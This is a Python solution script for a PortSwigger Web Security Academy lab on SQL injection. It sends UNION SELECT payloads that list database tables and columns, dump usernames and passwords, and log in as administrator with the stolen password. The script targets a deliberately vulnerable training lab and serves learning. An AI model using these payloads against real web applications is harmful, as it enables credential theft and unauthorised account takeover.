#https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#
import requests
import re

def find_name (response_text, name):
    start = response_text.find(name)
    len = response_text[start:].find('<')
    return response_text[start:start+len]

def csrf_fetch(response_text):
    match = re.search(r'name="csrf" value="(.+?)"', response_text)
    return match.group(1) if match else None

LAB_ID = '0a07006904a67ce3816a16a7009d0005' #YOUR LAB-ID
url = f"https://{LAB_ID}.web-security-academy.net/filter?category="
login_url = f"https://{LAB_ID}.web-security-academy.net/login"


r = requests.get(url)
if (r.status_code != 200):
    print(f"failed to reach the server: {r.status_code}")
    exit(1)

payload1 = "' UNION SELECT NULL, table_name from information_schema.tables --"

r = requests.get(url+payload1)
users_table = find_name(r.text, 'users')

payload2 = f"' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = '{users_table}' --"

r = requests.get(url+payload2)
usr_col = find_name(r.text, 'username')
pass_col = find_name(r.text, 'password')

payload3 = f"' UNION SELECT NULL, {usr_col}||{pass_col} FROM {users_table} --"

r = requests.get(url+payload3)

leng = len('administrator')
pass_index = r.text.find('administrator') + len('administrator')
pass_len = r.text[pass_index:].find('<')
password = r.text[pass_index:pass_index+pass_len]
print(password)


client = requests.Session()
r = client.get(login_url)
r = client.post(login_url, data={
    'username':'administrator',
    'password':password,
    'csrf':csrf_fetch(r.text)
    })

print(r.text)
print(r.status_code)
#payload4 = "' UNION SELECT NULL, CONCAT(username, ' ', password) FROM users --"